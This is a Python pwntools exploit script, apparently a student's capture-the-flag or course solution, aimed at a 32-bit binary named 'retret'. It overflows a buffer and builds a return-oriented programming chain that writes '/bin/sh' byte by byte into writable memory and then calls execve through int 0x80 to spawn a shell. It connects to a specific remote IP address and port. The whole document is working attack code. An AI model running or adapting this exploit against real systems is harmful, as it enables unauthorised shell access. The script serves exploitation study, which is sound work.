#Hyuntae Kim, 20184276
from pwn import *

REMOTE = True

int_80_ret = 0x08048554 #: int 0x80; ret; 
gadget0 = 0x08048897 #: xor byte ptr [ebp + 0xe], cl; and byte ptr [edi + 0xe], al; adc al, 0x41; ret; 
pop_ebp_ret = 0x080486fb #: pop ebp; ret; 
pop_ebx_ret = 0x08048355 #: pop ebx; ret; 
pop_edx_ret = 0x080485b9 #: pop edx; ret; 
pop_eax_pop_ecx_ret = 0x08048572 #: pop eax; pop ecx; ret; 
pop_esi_pop_edi_pop_ebp_ret = 0x080486f9 #: pop esi; pop edi; pop ebp; ret; 


if (REMOTE == False):
    s = process('./retret', env={'DUMMY':'a'*0x2000}) #DUMMY to expand the stack more widely
else:
    s = remote('143.248.38.212', 10005)

payload = 'a' * 0x1000          #junk for buf
payload += 'b' * 4              #junk for sfp
#write "/bin/shx00" at 0x804a800 which has rw permission and which is not influenced by aslr
payload += p32(pop_esi_pop_edi_pop_ebp_ret) #this is to set edi to meaningless address but which has rw permission
payload += p32(0)
payload += p32(0x804a900) #0x804a900 is ot influenced by aslr and it has rw permission
payload += p32(0)
i = 0
for ch in '/bin/sh\x00':
    #set ebp to &(0x804a800[i]) - 0xe
    payload += p32(pop_ebp_ret)
    payload += p32(0x804a800 + i - 0xe) #0xe is to adjust for gadget0
    #set ecx to each byte of "/bin/sh\x00". eax is meaning less
    payload += p32(pop_eax_pop_ecx_ret)
    payload += p32(0)
    payload += p32(ord(ch))
    #it does xor byte ptr [ebp+0xe], cl; byte ptr [edi + 0xe], al; mainly
    payload += p32(gadget0)
    i += 1
#set eax to 0x0b which is syscall number of execve() and ecx to NULL
payload += p32(pop_eax_pop_ecx_ret)
payload += p32(0x0b)
payload += p32(0)
#set ebx to &"/bin/sh\x00"
payload += p32(pop_ebx_ret)
payload += p32(0x804a800)
#set edx to NULL
payload += p32(pop_edx_ret)
payload += p32(0)
#call syscall handler
payload += p32(int_80_ret)
payload += 'c' * (0x1ffd - len(payload)) #junk for rest getc()

s.sendline(payload)
s.interactive()

